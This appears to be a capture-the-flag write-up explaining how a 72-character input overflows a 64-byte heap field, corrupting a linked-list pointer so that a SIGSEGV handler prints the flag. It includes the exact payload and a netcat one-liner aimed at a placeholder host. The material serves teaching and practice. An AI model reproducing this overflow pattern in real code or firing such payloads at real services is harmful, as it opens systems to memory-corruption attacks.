# n00bcak's Last Straw

## Overview

The challenge installs a custom handler for `SIGSEGV`:

```c
signal(SIGSEGV, win);
```

This means that causing a segmentation fault is enough to execute `win()`, which reads and prints the flag.

## Vulnerability

Each straw is represented by this structure:

```c
struct straw {
    struct straw* next_ptr;
    char data[0x40];
};
```

The memory layout is therefore:

```text
offset 0x00: next_ptr — 8 bytes
offset 0x08: data     — 64 bytes
```

However, `edit_straw()` accepts up to 72 characters for the 64-byte `data` field:

```c
scanf("%72s", cur_straw->data);
```

The eight extra characters overflow into the following straw's metadata. `scanf()` also appends a null terminator, corrupting another byte.

## Building the corrupted list

Initially, the list contains one straw:

```text
straw 0 -> NULL
```

After creating two more straws, the list becomes:

```text
straw 0 -> straw 1 -> straw 2 -> NULL
```

Editing straw 0 with 72 characters overflows into the memory occupied by straw 1 and corrupts its `next_ptr`:

```text
Before:  straw 0 -> straw 1 -> straw 2
After:   straw 0 -> straw 1 -> invalid pointer
```

When another straw is created, `create_straw()` walks the linked list:

```c
while (last_straw->next_ptr != NULL) {
    last_straw = last_straw->next_ptr;
}
```

The traversal follows the corrupted pointer and dereferences invalid memory, producing `SIGSEGV`. The registered signal handler then calls `win()` and prints the flag.

## Exploit

The interaction is:

```text
1
1
2
0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1
```

The steps are:

1. Create straw 1.
2. Create straw 2.
3. Select the edit option.
4. Edit straw 0.
5. Enter exactly 72 `A` characters.
6. Create another straw to trigger traversal of the corrupted pointer.

The payload can be sent automatically with:

```bash
python3 -c 'print("1\n1\n2\n0\n" + "A"*72 + "\n1\n")' | nc HOST PORT
```

Replace `HOST` and `PORT` with the challenge server address.

## Conclusion

The challenge is solved by combining a heap-based buffer overflow with the existing `SIGSEGV` handler. The oversized input corrupts the linked-list pointer, and the next list traversal causes the segmentation fault that invokes `win()`.
